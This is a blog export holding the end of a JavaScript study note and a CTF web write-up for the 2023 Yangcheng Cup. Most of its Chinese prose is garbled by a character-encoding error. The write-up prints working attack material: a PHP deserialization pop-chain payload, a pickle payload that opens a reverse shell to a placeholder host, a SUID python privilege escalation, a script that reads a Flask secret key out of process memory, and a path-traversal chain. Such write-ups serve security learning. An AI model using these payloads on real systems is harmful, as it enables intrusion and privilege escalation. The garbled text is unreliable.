\n}\n```\n\nè¿˜æœ‰ä¸€ä¸ªå°ç‚¹å°±æ˜¯`case(æ¡ä»¶)`è¿™é‡Œæ¡ä»¶ä¸­çš„ç­‰å·æ˜¯å¼ºç­‰äº ä¸ä»…æ¯”è¾ƒå€¼ä¹Ÿè¦æ¯”è¾ƒç±»å‹\n\n## default\n\nä¹Ÿå°±æ˜¯å½“ä»¥ä¸Šæ¡ä»¶éƒ½ä¸æ‰§è¡Œæ—¶ï¼Œå°±æ‰§è¡Œè¯¥defaultä¸‹çš„è¯­å¥\n\n# JSç±»å‹è½¬æ¢\n\n## constructorå±æ€§\n\nconstructor å±æ€§è¿”å›æ‰€æœ‰ JavaScript å˜é‡çš„æ„é€ å‡½æ•°ã€‚\n\n```plain\n\"John\".constructor                 // è¿”å›å‡½æ•° String()  { [native code] }\n(3.14).constructor                 // è¿”å›å‡½æ•° Number()  { [native code] }\nfalse.constructor                  // è¿”å›å‡½æ•° Boolean() { [native code] }\n[1,2,3,4].constructor              // è¿”å›å‡½æ•° Array()   { [native code] }\n{name:'John', age:34}.constructor  // è¿”å›å‡½æ•° Object()  { [native code] }\nnew Date().constructor             // è¿”å›å‡½æ•° Date()    { [native code] }\nfunction () {}.constructor         // è¿”å›å‡½æ•° Function(){ [native code] }\n```\n\nç±»å‹è½¬æ¢æ¯”å¦‚:\n\n```plain\nvar a=123\nString(a) \naå°±è¢«è½¬ä¸ºå­—ç¬¦ä¸²ç±»å‹äº†\n```\n\n# Forå¾ªç¯\n\nè¯­æ³•ï¼š\n\n```plain\nfor (è¯­å¥ 1; è¯­å¥ 2; è¯­å¥ 3)\n{\n    è¢«æ‰§è¡Œçš„ä»£ç å—\n}\n```\n\negï¼š\n\n```plain\nfor (var i=0; i<5; i++)\n{\n      x=x + \"è¯¥æ•°å­—ä¸º \" + i + \"<br>\";\n}\n```\n\n# whileå¾ªç¯\n\nè¯­æ³•ï¼š\n\n```plain\nwhile (æ¡ä»¶)\n{\n    éœ€è¦æ‰§è¡Œçš„ä»£ç \n}\n```\n\n## do-whileå¾ªç¯\n\nè¯¥å¾ªç¯ä¼šåœ¨æ£€æŸ¥æ¡ä»¶æ˜¯å¦ä¸ºçœŸä¹‹å‰æ‰§è¡Œä¸€æ¬¡ä»£ç å—ï¼Œç„¶åå¦‚æœæ¡ä»¶ä¸ºçœŸçš„è¯ï¼Œå°±ä¼šé‡å¤è¿™ä¸ªå¾ªç¯ã€‚\n\nè¯­æ³•ï¼š\n\n```plain\ndo\n{\n    éœ€è¦æ‰§è¡Œçš„ä»£ç \n}\nwhile (æ¡ä»¶);\n```\n\n# breakå’Œcontinueè¯­å¥\n\nç®€å•è¯´å°±æ˜¯breakè·³å‡ºæ•´ä¸ªå¾ªç¯\n\ncontinueè·³å‡ºæ­¤æ¬¡å¾ªç¯ç„¶åç»§ç»­ä¸‹ä¸ªå¾ªç¯\n\n# jsé”™è¯¯-throwã€tryã€catch\n\n```plain\ntry è¯­å¥æµ‹è¯•ä»£ç å—çš„é”™è¯¯\ncatch è¯­å¥å¤„ç†é”™è¯¯\nthrow è¯­å¥åˆ›å»ºè‡ªå®šä¹‰é”™è¯¯\nfinally è¯­å¥åœ¨ try å’Œ catch è¯­å¥ä¹‹åï¼Œæ— è®ºæ˜¯å¦æœ‰è§¦å‘å¼‚å¸¸ï¼Œè¯¥è¯­å¥éƒ½ä¼šæ‰§è¡Œ\n```\n\nè¯­æ³•ï¼š\n\n```plain\ntry {\n    ...    //å¼‚å¸¸çš„æŠ›å‡º\n} catch(e) {\n    ...    //å¼‚å¸¸çš„æ•è·ä¸å¤„ç†\n} finally {\n    ...    //ç»“æŸå¤„ç†\n}\n```\n\nthrowæ”¾åœ¨tryä¸‹è¯­å¥ï¼Œé‚£ä¹ˆèƒ½å¤Ÿæ§åˆ¶ç¨‹åºæµï¼Œå¹¶ç”Ÿæˆè‡ªå®šä¹‰çš„é”™è¯¯æ¶ˆæ¯\n\n# JSå£°æ˜æå‡\n\nå£°æ˜æå‡ï¼šå‡½æ•°å£°æ˜å’Œå˜é‡å£°æ˜æ€»æ˜¯ä¼šè¢«è§£é‡Šå™¨æ‚„æ‚„åœ°è¢«\"æå‡\"åˆ°æ–¹æ³•ä½“çš„æœ€é¡¶éƒ¨ã€‚\n\nå‡½æ•°åŠå˜é‡çš„å£°æ˜éƒ½å°†è¢«æå‡åˆ°å‡½æ•°çš„æœ€é¡¶éƒ¨\n\nå˜é‡å¯ä»¥åœ¨ä½¿ç”¨åå£°æ˜ï¼Œä¹Ÿå°±æ˜¯å˜é‡å¯ä»¥å…ˆä½¿ç”¨å†å£°æ˜ \n\nåªæœ‰å£°æ˜çš„å˜é‡ä¼šæå‡ï¼Œåˆå§‹åŒ–çš„ä¸ä¼š\n\nè¿™é‡Œéœ€è¦ç†è§£ä»€ä¹ˆæ˜¯å£°æ˜ ä»€ä¹ˆæ˜¯åˆå§‹åŒ–\n\n```plain\nvar x; #è¿™æ˜¯å£°æ˜\nvar y=10; #è¿™æ˜¯åˆå§‹åŒ–\nä¹Ÿå°±æ˜¯è¯´å•çº¯å®šä¹‰å˜é‡æ˜¯å£°æ˜ å®šä¹‰å¹¶ä¸”èµ‹å€¼å°±æ˜¯åˆå§‹åŒ–äº†\n```\n\n# JSä¸¥æ ¼æ¨¡å¼\n\nä¸¥æ ¼æ¨¡å¼é€šè¿‡åœ¨è„šæœ¬æˆ–å‡½æ•°çš„å¤´éƒ¨æ·»åŠ  `use strict;` è¡¨è¾¾å¼æ¥å£°æ˜ã€‚\n\nä¸ºä»€ä¹ˆä½¿ç”¨ä¸¥æ ¼æ¨¡å¼:\n\næ¶ˆé™¤Javascriptè¯­æ³•çš„ä¸€äº›ä¸åˆç†ã€ä¸ä¸¥è°¨ä¹‹å¤„ï¼Œå‡å°‘ä¸€äº›æ€ªå¼‚è¡Œä¸º;\n\n- æ¶ˆé™¤ä»£ç è¿è¡Œçš„ä¸€äº›ä¸å®‰å…¨ä¹‹å¤„ï¼Œä¿è¯ä»£ç è¿è¡Œçš„å®‰å…¨ï¼›\n- æé«˜ç¼–è¯‘å™¨æ•ˆç‡ï¼Œå¢åŠ è¿è¡Œé€Ÿåº¦ï¼›\n- ä¸ºæœªæ¥æ–°ç‰ˆæœ¬çš„Javascriptåšå¥½é“ºå«ã€‚\n\n\"ä¸¥æ ¼æ¨¡å¼\"ä½“ç°äº†Javascriptæ›´åˆç†ã€æ›´å®‰å…¨ã€æ›´ä¸¥è°¨çš„å‘å±•æ–¹å‘ï¼ŒåŒ…æ‹¬IE 10åœ¨å†…çš„ä¸»æµæµè§ˆå™¨ï¼Œéƒ½å·²ç»æ”¯æŒå®ƒï¼Œè®¸å¤šå¤§é¡¹ç›®å·²ç»å¼€å§‹å…¨é¢æ‹¥æŠ±å®ƒã€‚\n\nå¦ä¸€æ–¹é¢ï¼ŒåŒæ ·çš„ä»£ç ï¼Œåœ¨\"ä¸¥æ ¼æ¨¡å¼\"ä¸­ï¼Œå¯èƒ½ä¼šæœ‰ä¸ä¸€æ ·çš„è¿è¡Œç»“æœ\n\nä¸¥æ ¼æ¨¡å¼é™åˆ¶ï¼š\n\n- ä¸å®¹è®¸ä½¿ç”¨æœªå£°æ˜çš„å˜é‡\n- ä¸å®¹è®¸åˆ é™¤å˜é‡æˆ–å¯¹è±¡\n- ä¸å®¹è®¸åˆ é™¤å‡½æ•°\n- ä¸å®¹è®¸å˜é‡é‡å\n- ä¸å®¹è®¸ä½¿ç”¨å…«è¿›åˆ¶\n- ä¸å®¹è®¸ä½¿ç”¨è½¬ä¹‰å­—ç¬¦\n- ä¸å®¹è®¸å¯¹åªè¯»å±æ€§èµ‹å€¼\n- ä¸å®¹è®¸å¯¹ä¸€ä¸ªä½¿ç”¨getteræ–¹æ³•è¯»å–çš„å±æ€§è¿›è¡Œèµ‹å€¼\n- ä¸å®¹è®¸åˆ é™¤ä¸€ä¸ªä¸å®¹è®¸åˆ é™¤çš„å±æ€§\n- å˜é‡åä¸èƒ½ä½¿ç”¨`'evalï¼Œarguments'`å­—ç¬¦ä¸²\n- ä¸å®¹è®¸ä½¿ç”¨è¿™ç§è¯­å¥`\"use strict\";with (Math){x = cos(2)};// æŠ¥é”™ `\n- ç”±äºä¸€äº›å®‰å…¨åŸå› ï¼Œåœ¨ä½œç”¨åŸŸ eval() åˆ›å»ºçš„å˜é‡ä¸èƒ½è¢«è°ƒç”¨\n- ç¦æ­¢thiså…³é”®å­—æŒ‡å‘å…¨å±€å¯¹è±¡\n\n\n\n# JSONæ•°æ®\n\n- JSONæ•°æ®çš„æœ¬è´¨æ˜¯ä¸€ä¸ªæœ‰è§„åˆ™ã€å¯ä»¥è§£æçš„å­—ç¬¦ä¸²\n- JSONæ•°æ®åœ¨jsä¸­å°±æ˜¯ä¸€ä¸ªå¯¹è±¡\n\n## JSONæ ¼å¼ï¼š\n\n- `{}`:å®šä¹‰JSONå¯¹è±¡\n- `[]`ï¼šå®šä¹‰JSONæ•°æ®\n\n```html\nvar json01 = { \"name\":\"ä¸‰å›½æ¼”ä¹‰\", \"price\":55.55, \"version\":\"ä¸‰å›½æ¼”ä¹‰version01\" };\nvar json02 = { \"name\":\"çº¢æ¥¼æ¢¦\", \"price\":99.99, \"version\":\"çº¢æ¥¼æ¢¦version01\" };\nvar json03 = { \"name\":\"è¥¿æ¸¸è®°\", \"price\":66.65, \"version\":\"è¥¿æ¸¸è®°version01\" };\nvar jsonList=[\n        json01,\n        json02,\n        json03,\n        {\"name\":\"æ°´æµ’ä¼ \",\"price\":0.00,\"version\":\"null\"}\n    ];\n```\n\n## JSONå¯¹è±¡å’ŒJSONå­—ç¬¦ä¸²äº’è½¬\n\n- JSON.stringify( )ï¼šJSONå¯¹è±¡è½¬JSONå­—ç¬¦ä¸²\n- JSON.parse( )ï¼šJSONå­—ç¬¦ä¸²è½¬JSONå¯¹è±¡\n\n```html\nvar jsonObj = {\"stuName\":\"tom\",\"stuAge\":20};\nvar jsonStr = JSON.stringify(jsonObj);\nconsole.log(typeof jsonObj); // object\nconsole.log(typeof jsonStr); // string\nvar json=JSON.parse(jsonStr);\nconsole.log(typeof json); // object\n```\n\n# å‘æœªå£°æ˜çš„ JavaScript å˜é‡åˆ†é…å€¼\n\nå¦‚æœæŠŠå€¼èµ‹ç»™å°šæœªå£°æ˜çš„å˜é‡ï¼Œè¯¥å˜é‡å°†è¢«è‡ªåŠ¨ä½œä¸º window çš„ä¸€ä¸ªå±æ€§ã€‚\n\n```\ncarname=\"Volvo\";\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694274282232-728d187d-e1bb-4900-9fd3-d9ef8f94c90c.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694274292688-feaec007-0744-4bda-ba1e-33668a514ac3.png)\n\n# JavaScript äº‹ä»¶\n\nHTML äº‹ä»¶æ˜¯å‘ç”Ÿåœ¨ HTML å…ƒç´ ä¸Šçš„äº‹æƒ…ã€‚\n\nå½“åœ¨ HTML é¡µé¢ä¸­ä½¿ç”¨ JavaScript æ—¶ï¼Œ JavaScript å¯ä»¥è§¦å‘è¿™äº›äº‹ä»¶ã€‚\n\n## å¸¸è§HTMLäº‹ä»¶åˆ—è¡¨ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694322511181-6d2ae76b-5770-4457-8119-23c806db8f59.png)\n\n\n\n\n\n\n\n# DOMæ–‡æ¡£å¯¹è±¡æ¨¡å‹\n\nJavaScript è¯­å¥æ˜¯å‘ç»™æµè§ˆå™¨çš„å‘½ä»¤ã€‚\n\nè¿™äº›å‘½ä»¤çš„ä½œç”¨æ˜¯å‘Šè¯‰æµè§ˆå™¨è¦åšçš„äº‹æƒ…ã€‚\n\n- documentå¯¹è±¡ï¼šä»£è¡¨æ•´ä¸ªé¡µé¢çš„å¯¹è±¡ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨çš„å†…ç½®å¯¹è±¡\n- DOMçš„ä½œç”¨æ˜¯ä½¿ç”¨JSä»£ç æ“ä½œHTMLé¡µé¢çš„æ ‡ç­¾å’Œå†…å®¹\n\n\n\n\n\n# DOMæ ‘\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693906043115-cddd2244-3b38-4f4a-8043-055aaea864bf.png)\n\nå‡å­¦ä¹ äºï¼š\n\nhttps://www.runoob.com/js/js-htmldom.html\n\nhttps://www.kuangstudy.com/bbs/1571499157607657474\n\nhttps://www.kuangstudy.com/bbs/1679494100476669953\n","categories":["çŸ¥è¯†å­¦ä¹ "]},{"title":"2023ç¾ŠåŸæ¯WEB WPä¸å¤ç°å­¦ä¹ ","url":"/post/3edff1a9.html","content":"\n2023ç¾ŠåŸæ¯WEB WPä¸å¤ç°å­¦ä¹ \n\n<!--more-->\n\n# WEB\n\n## D0n't pl4y g4m3!!!\n\nphp 7.4.21æºç æ³„éœ²  ä¹‹å‰ä¸œåŒ—ç”µåŠ›å¤§å­¦ä¸¾åŠçš„ä¸€ä¸ªctfæ¯”èµ›ä¸Šå‡ºè¿‡ç±»ä¼¼é¢˜ç›®\n\n```\n/hint.zip\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693623290570-7868b5b7-d2cd-4183-88c1-b7af0b623684.png)\n\n```\nflagåœ¨/tmp/catcatf1ag.txt\n```\n\nç„¶åç”¨æºç æ³„éœ²p0p.php\n\n```plain\n<?php\nclass Pro{\n    private $exp;\n    private $rce2;\n\n    public function __get($name)\n    {\n        return $this->$rce2=$this->exp[$rce2];\n    }\n    public  function __toString()\n    {\n        call_user_func('system', \"cat /flag\");\n    }\n}\n\nclass Yang\n{\n    public function __call($name, $ary)\n    {\n        if ($this->key === true || $this->finish1->name) {\n            if ($this->finish->finish) {\n                call_user_func($this->now[$name], $ary[0]);\n            }\n        }\n    }\n    public function ycb()\n    {\n        $this->now = 0;\n        return $this->finish->finish;\n    }\n    public function __wakeup()\n    {\n        $this->key = True;\n    }\n}\nclass Cheng\n{\n    private $finish;\n    public $name;\n    public function __get($value)\n    {\n\n        return $this->$value = $this->name[$value];\n    }\n}\nclass Bei\n{\n    public function __destruct()\n    {\n        if ($this->CTF->ycb()) {\n            $this->fine->YCB1($this->rce, $this->rce1);\n        }\n    }\n    public function __wakeup()\n    {\n        $this->key = false;\n    }\n}\n\nfunction prohib($a){\n    $filter = \"/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i\";\n    return preg_replace($filter,'',$a);\n}\n$a = $_POST[\"CTF\"];\nif(isset($a)){\n    unserialize(prohib($a));\n}\n?>\n```\n\nä¹‹åå°±æ˜¯ä¸€ä¸ªpopé“¾\n\npaylaodå¦‚ä¸‹ï¼š\n\n```plain\n<?php\nhighlight_file(__FILE__);\nclass Pro{\n    private $exp;\n    private $rce2;}\n\nclass Yang{\n    \n}\n\nclass Cheng\n{\n    private $finish;\n    public $name;\n\n}\nclass Bei\n{\n\n}\n$a = new Bei();\n$a->rce = '/tmp/catcatf1ag.txt';\n$a->rce1='/tmp/catcatf1ag.txt';\n$a->CTF = new Yang();\n$a->CTF->finish->finish =1;\n$a->fine = new Yang();\n$a->fine->finish1->name=1;\n$a->fine->finish->finish=1;\n$a->fine->now=[\"YCB1\"=>\"highlight_file\"];\necho urlencode(serialize($a));\n?>\n```\n\nå­¦åˆ°äº†æ–°trick è¿™é‡Œä¹Ÿå¯ä»¥ä¸ç”¨æ–‡ä»¶åŒ…å«å‡½æ•° ç›´æ¥åŒå†™ç»•è¿‡waféƒ½å¯ä»¥\n\n##  Serpent\n\nflaskä¼ªé€ +pythonååºåˆ—åŒ–+ææƒ\n\næ²¡æ€ä¹ˆä»”ç»†å¥½å¥½å­¦è¿‡pythonååºåˆ—åŒ– åœ¨è¿™é‡Œå¯„äº†\n\nè·å¾—æºç \n\n```plain\n@app.route('/verification')\ndef verification():\n    try:\n        attribute = session.get('Attribute')\n        if not isinstance(attribute, dict):\n            raise Exception\n    except Exception:\n        return 'Hacker!!!'\n    if attribute.get('name') == 'admin':\n        if attribute.get('admin') == 1:\n            return secret\n        else:\n            return \"Don't play tricks on me\"\n    else:\n        return \"You are a perfect stranger to me\"\n\nif __name__ == '__main__':\n    app.run('0.0.0.0', port=80)\n```\n\nä¸€çœ¼ä¸çœŸ sessionä¼ªé€  ç›´æ¥è§£ç sessionç»™äº†keyçš„ `GWHTNrtE8JiVyR`\n\nä¹‹åè®¿é—®`/src0de`è·¯ç”±å†æ¬¡æ‹¿åˆ°æºç \n\n```plain\n@app.route('/ppppppppppick1e')\ndef ppppppppppick1e():\n    try:\n        username = \"admin\"\n        rsp = make_response(\"Hello, %s \" % username)\n        rsp.headers['hint'] = \"Source in /src0de\"\n        pick1e = request.cookies.get('pick1e')\n        if pick1e is not None:\n            pick1e = base64.b64decode(pick1e)\n        else:\n            return rsp\n        if check(pick1e):\n            pick1e = pickle.loads(pick1e)\n            return \"Go for it!!!\"\n        else:\n            return \"No Way!!!\"\n    except Exception as e:\n        error_message = str(e)\n        return error_message\n\n    return rsp\n\nclass GWHT():\n    def __init__(self):\n        pass\n\nif __name__ == '__main__':\n    app.run('0.0.0.0', port=80)\n```\n\nè€ƒå¯Ÿpythonååºåˆ—åŒ– å¹¶ä¸”æœ‰waf è¦bypass R\n\næ‰€ä»¥ç”¨oæŒ‡ä»¤æ¥ç»•è¿‡\n\n```plain\nfrom flask import Flask\nimport base64\npayload=b'''(cos\nsystem\nS'bash -c \"bash -i >& /dev/tcp/ip/port <&1\"'\no.'''\nprint(base64.b64encode(payload))\n```\n\næˆ–è€…ç”¨iæŒ‡ä»¤æ¥ç»•è¿‡ éƒ½æ˜¯å‡ºè‡ª:https://tttang.com/archive/1885/#toc_i\n\n```plain\nfrom flask import Flask\nimport base64\nopcode=b'''(S'whoami'\nios\nsystem\n.'''\nprint(base64.b64encode(payload))\n```\n\nåå¼¹shell å‘ç°è¿˜è¦ææƒ è¯»ä¸äº†flag\n\n**å› ä¸ºè¿™ä¸ªé¢˜ç›®python3.8å­˜åœ¨suid æ–‡ä»¶å…·æœ‰ SUID æƒé™ï¼Œå› æ­¤å½“æ™®é€šç”¨æˆ·è¿è¡Œå®ƒæ—¶ï¼Œè¯¥ç¨‹åºä¼šä»¥æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™æ¥è¿è¡Œ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ææƒ**\n\n`python3.8 -c \"import os;os.execl('/bin/sh','sh','-p')\"` -cæ˜¯å‘½ä»¤è¡Œé€‰é¡¹\n\næˆ–è€…æ›´ç®€å•ç‚¹`python3 -c \"print(open('/flag').read(0)\"`\n\n```\nè§£é‡Šï¼š\n\"import os;os.execl('/bin/sh','sh','-p')\"ï¼šè¿™éƒ¨åˆ†æ˜¯å®é™…çš„ Python ä»£ç ç‰‡æ®µï¼Œå®ƒç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼š\nimport osï¼šè¿™è¡Œä»£ç å¯¼å…¥äº† Python ä¸­çš„ os æ¨¡å—ï¼Œè¯¥æ¨¡å—æä¾›äº†ä¸æ“ä½œç³»ç»Ÿäº¤äº’çš„åŠŸèƒ½ã€‚\nos.execl('/bin/sh', 'sh', '-p')ï¼šè¿™æ˜¯è¦æ‰§è¡Œçš„ Python ä»£ç ã€‚å®ƒä½¿ç”¨ os.execl() å‡½æ•°æ‰§è¡Œäº†ä¸€ä¸ªç³»ç»Ÿå‘½ä»¤ã€‚å…·ä½“åœ°è¯´ï¼š\n'/bin/sh' æ˜¯è¦æ‰§è¡Œçš„ç¨‹åºçš„è·¯å¾„ï¼Œå³ Unix Shell çš„è·¯å¾„ã€‚\n'sh' æ˜¯æ–°ç¨‹åºçš„åç§°ï¼Œé€šå¸¸æ˜¯ Shell çš„åç§°ã€‚\n'-p' æ˜¯ä¼ é€’ç»™æ–°ç¨‹åºçš„å‚æ•°ï¼Œè¿™é‡Œè¡¨ç¤ºä»¥ç‰¹æƒæ¨¡å¼å¯åŠ¨ Shellã€‚\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693661431373-9a66c8fd-ce25-40a0-8847-bad7363150a5.png)\n\n##  ArkNights\n\n### éé¢„æœŸè§£\n\néé¢„æœŸäº†payload:`/read?file=/proc/1/environ`\n\nè¯»ç¯å¢ƒå˜é‡å°±æœ‰\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693660447816-3625b299-1051-4a75-abc6-1443251980ad.png)\n\n### é¢„æœŸè§£\n\nè€ƒç‚¹:\n\n- é€šè¿‡/proc/self/memå†…å­˜è·å–secretkey\n- pythonçš„å˜é‡æ±¡æŸ“å¯¼è‡´renderå¯ä»¥ç›®å½•ç©¿è¶Š\n- ä»»æ„æ–‡ä»¶è¯»å–\n\né¦–å…ˆè·å¾—æºç :\n\n```plain\nimport uuid\nfrom flask import *\nfrom werkzeug.utils import *\napp = Flask(__name__)\napp.config['SECRET_KEY'] =str(uuid.uuid4()).replace(\"-\",\"*\")+\"Boogipopisweak\"\n@app.route('/')\ndef index():\n    name=request.args.get(\"name\",\"name\")\n    m1sery=[request.args.get(\"m1sery\",\"Doctor.Boogipop\")]\n    if(session.get(\"name\")==\"Dr.Boog1pop\"):\n        blacklist=re.findall(\"/ba|sh|\\\\\\\\|\\[|]|#|system|'|\\\"/\", name, re.IGNORECASE)\n        if blacklist:\n            return \"bad hacker no way\"\n        exec(f'for [{name}] in [{m1sery}]:print(\"strange?\")')\n    else:\n        session['name'] = \"Doctor\"\n    return render_template(\"index.html\",name=session.get(\"name\"))\n@app.route('/read')\ndef read():\n        file = request.args.get('file')\n        fileblacklist=re.findall(\"/flag|fl|ag/\",file, re.IGNORECASE)\n        if fileblacklist:\n            return \"bad hacker!\"\n        start=request.args.get(\"start\",\"0\")\n        end=request.args.get(\"end\",\"0\")\n        if start==\"0\" and end==\"0\":\n            return open(file,\"rb\").read()\n        else:\n            start,end=int(start),int(end)\n            f=open(file,\"rb\")\n            f.seek(start)\n            data=f.read(end)\n            return data\n@app.route(\"/<path:path>\")\ndef render_page(path):\n    print(os.path.pardir)\n    print(path)\n    if not os.path.exists(\"templates/\" + path):\n        return \"not found\", 404\n    return render_template(path)\nif __name__=='__main__':\n    app.run(\n        debug=False,\n        host=\"0.0.0.0\"\n    )\n    print(app.config['SECRET_KEY'])\n```\n\né¦–å…ˆå°±æ˜¯å»ä¼ªé€ session è€è€ƒç‚¹äº† é€šè¿‡è®¡ç®—å†…å­˜åç§»é‡æ¥è¯»å–å†…å­˜ä¸­çš„secretkey\n\nè¯»å–`/proc/self/maps`å¯ä»¥å¾—åˆ°å½“å‰è¿›ç¨‹çš„å†…å­˜æ˜ å°„å…³ç³»ï¼Œé€šè¿‡è¯»è¯¥æ–‡ä»¶çš„å†…å®¹å¯ä»¥å¾—åˆ°å†…å­˜ä»£ç æ®µåŸºå€ã€‚\n\n`/proc/self/mem`æ˜¯è¿›ç¨‹çš„å†…å­˜å†…å®¹ï¼Œé€šè¿‡ä¿®æ”¹è¯¥æ–‡ä»¶ç›¸å½“äºç›´æ¥ä¿®æ”¹å½“å‰è¿›ç¨‹çš„å†…å­˜ã€‚è¯¥æ–‡ä»¶ä¸èƒ½ç›´æ¥è¯»å–ï¼Œéœ€è¦ç»“åˆmapsçš„æ˜ å°„ä¿¡æ¯æ¥ç¡®å®šè¯»çš„åç§»å€¼ã€‚å³æ— æ³•è¯»å–æœªè¢«æ˜ å°„çš„åŒºåŸŸï¼Œåªæœ‰è¯»å–çš„åç§»å€¼æ˜¯è¢«æ˜ å°„çš„åŒºåŸŸæ‰èƒ½æ­£ç¡®è¯»å–å†…å­˜å†…å®¹ã€‚\n\nè„šæœ¬å¦‚ä¸‹:\n\n```plain\nimport os\nimport  re\nimport requests\nurl=\"http://8.130.34.53:8848\"\nmaps_url = f\"{url}/read?file=/proc/self/maps\"\nmaps_reg = \"([a-z0-9]{12}-[a-z0-9]{12}) rw.*?00000000 00:00 0\"\nmaps = re.findall(maps_reg, requests.get(maps_url).text)\nprint(maps)\n#print(requests.get(maps_url).text)\nfor m in maps:\n    print(m)\n    start, end = m.split(\"-\")[0], m.split(\"-\")[1]\n    Offset, Length = str(int(start, 16)), str(int(end, 16) - int(start, 16))\n    read_url = f\"{url}/read?file=/proc/self/mem&start={Offset}&end={Length}\"\n    s = requests.get(read_url).content\n    rt = re.findall(b\"[a-z0-9]{8}\\*[a-z0-9]{4}\\*[a-z0-9]{4}\\*[a-z0-9]{4}\\*[a-z0-9]{12}Boogipopisweak\", s)\n    print(rt)\n```\n\nç„¶åå°±æ˜¯æˆ‘ä¸çŸ¥é“çš„çŸ¥è¯†äº† ç›´æ¥æ¥çœ‹ç¥ã®WP\né¦–å…ˆæ˜¯pythonçš„ä¸€ä¸ªé»‘é­”æ³•å¯¼è‡´å˜é‡è¦†ç›–\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694011985226-0e294a99-187a-45f7-9268-6a56df3e24ad.png)\n\næ‰€ä»¥åˆ©ç”¨ç‚¹åœ¨è¿™é‡Œ:\n\n```plain\nexec(f'for [{name}] in [{m1sery}]:print(\"strange?\")')\n```\n\nå…¶æ¬¡æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥è¦†ç›–ç¯å¢ƒå˜é‡ å½“ç„¶ç¥å·²ç»è€ƒè™‘åˆ°äº†ï¼š\n\n> é‚£ä¹ˆå‡å¦‚æˆ‘ä»¬æƒ³è¦†ç›–ç¯å¢ƒå˜é‡å¯ä»¥æ€ä¹ˆåšå‘¢ï¼Ÿ\n>\n> `[[str][0]for[os.environ['BASH_FUNC_echo%%']]in[['() { id; }']]]`\n>\n> æŒ‰ç…§ä¸Šè¿°ä»£ç å°±å¯ä»¥è¦†ç›–ç¯å¢ƒå˜é‡ï¼Œè°ƒç”¨äº†osæ¨¡å—è¿›è¡Œæ±¡æŸ“ï¼Œå¦‚ä¸Šä»£ç å¯ä»¥rceè¾“å‡ºidæŒ‡ä»¤ï¼Œä½†æ˜¯æˆ‘åœ¨é¢˜ç›®é‡Œbanäº†ï¼Œå› æ­¤æ˜¯ä¸å¯è¡Œçš„ã€‚\n\nè¿™é‡Œæ¶‰åŠåˆ°ä¹‹å‰idekè€ƒçš„ä¸€ä¸ªpydashåŸå‹é“¾æ±¡æŸ“çš„éé¢„æœŸäº†ï¼Œæ˜¯é€šè¿‡æ±¡æŸ“`os.path.pardir`è¿™ä¸ªå˜é‡æ¥å…è®¸ç›®å½•ç©¿è¶Šçš„ï¼Œæˆ‘ä»¬æ±¡æŸ“äº†os.path.pardirå°±å¯ä»¥å®ç°è·¯å¾„ç©¿è¶Šäº† ä¿®æ”¹çš„å€¼ä¸ºä»»æ„ \n\næ¥è‡ªï¼šhttps://tttang.com/archive/1876/#toc_ospathpardir\n\nè‡³äºä¸ºä»€ä¹ˆå˜› åˆ†ææºç åˆ†æçš„ ã€‚ã€‚ã€‚ã€‚qwqï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ ğŸ‚ æˆ‘è®°ä½ç»“è®ºäº†:)\n\nå› æ­¤æ•´ä¸ªæ­¥éª¤ä¸º:\n\n1. ä»å†…å­˜ä¸­é€šè¿‡åç§»é‡è¯»å–secretkey ä¼ªé€ session\n2. ç„¶ååˆ©ç”¨pythoné»‘é­”æ³•å»æ±¡æŸ“os.path.pardir\n3. è·¯å¾„ç©¿è¶Šè¯»flag\n\nç¯å¢ƒç»™çš„flagä½äº/tmp/flagä¸­ æ‰€ä»¥è·¯å¾„ç©¿è¶Šå³å¯ è®°å¾—è·¯å¾„è¦urlç¼–ç \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694012734069-f27e4a64-739c-4798-bbba-e4a8545c51b6.png)\n\nçœŸä¸é”™å•Š å­¦åˆ°çŸ¥è¯†å¥½å¤šï¼\n\n## ezyaml\n\næºç å¦‚ä¸‹ï¼š\n\n```plain\nimport tarfile\nfrom flask import Flask, render_template, request, redirect\nfrom hashlib import md5\nimport yaml\nimport os\nimport re\n\n\napp = Flask(__name__)\n\ndef waf(s):  #è®¾ç½®waf\n    flag = True\n    blacklist = ['bytes','eval','map','frozenset','popen','tuple','exec','\\\\','object','listitems','subprocess','object','apply']\n    for no in blacklist:\n        if no.lower() in str(s).lower():\n            flag= False\n            print(no)\n            break\n    return flag\ndef extractFile(filepath, type):     \n\n    extractdir = filepath.split('.')[0]  #è·å–ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶åä¸åŒ…æ‹¬åç¼€\n    if not os.path.exists(extractdir):\n        os.makedirs(extractdir)\n\n\n    if type == 'tar':\n        tf = tarfile.TarFile(filepath) #åˆ›å»ºäº†ä¸€ä¸ª tarfile.TarFile å¯¹è±¡ï¼Œç”¨äºæ“ä½œtarå‹ç¼©æ–‡ä»¶\n        tf.extractall(extractdir)  #å°†taræ–‡ä»¶ä¸­çš„æ‰€æœ‰å†…å®¹è§£å‹åˆ°æŒ‡å®šçš„ç›®å½•extractdirä¸­\n        return tf.getnames()  #è·å–è§£å‹åçš„æ–‡ä»¶ååˆ—è¡¨å¹¶ä¸”è¿”å›\n\n@app.route('/', methods=['GET'])\ndef main():\n        fn = 'uploads/' + md5().hexdigest()  #åˆ›å»ºæ–‡ä»¶ä¸Šä¼ è·¯å¾„åˆå§‹åŒ–\n        if not os.path.exists(fn):\n            os.makedirs(fn)\n        return render_template('index.html')\n\n\n@app.route('/upload', methods=['GET', 